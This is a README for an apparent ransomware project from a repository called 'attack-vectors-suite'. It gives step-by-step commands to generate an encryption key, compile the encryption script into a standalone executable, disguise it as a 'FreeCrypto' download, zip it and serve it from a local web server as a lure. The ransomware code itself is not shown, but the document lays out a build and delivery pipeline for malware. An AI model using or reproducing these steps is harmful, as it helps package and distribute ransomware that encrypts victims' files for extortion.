# Ransomware
**Ransomware is a type of malware from cryptovirology that threatens to publish the victim's personal data or permanently block access to it unless a ransom is paid** - Wikipedia

## Run Locally

Clone the project

```bash
  git clone https://github.com/SANTHOSH17-DOT/attack-vectors-suite
```

Go to the project directory

```bash
  cd ./RANSOMWARE
```

Generate key and add it to ./encryption/encrypt.py file

```bash
  cd ./key
  python3 generate_key.py
  cd ..
```

Create binary executable for the encryption script

```bash
  cd ./encryption
  pyinstaller --onefile encrypt.py
  cd ..
```

Compress the exe file to preserve the file permissions

```bash
  cp ./encryption/dist/encrypt ./webpage/FreeCrypto`
  cd ./webpage
  zip ./FreeCrypto.zip ./FreeCrypto
```

Start a http server in the webpage directory

```bash
  python3 -m http.server 9000
```

